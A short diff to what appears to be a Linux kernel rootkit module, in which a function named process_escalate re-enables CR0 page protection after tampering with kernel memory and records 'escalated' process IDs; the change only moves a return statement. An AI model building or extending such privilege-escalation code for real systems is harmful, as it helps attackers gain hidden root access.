@@ -159,11 +159,11 @@ static int process_escalate(pid_t pid){
     write_cr0(read_cr0() | 0x10000); //enable page protection
     /*add pid node to LL*/
     insert_pid_node(&head, new_node);
-    return;
   }
 #ifdef DEBUG
   printk("process %d already is escalated", pid);
 #endif
+  return 0;
 }
 
 static int process_deescalate(pid_t pid){
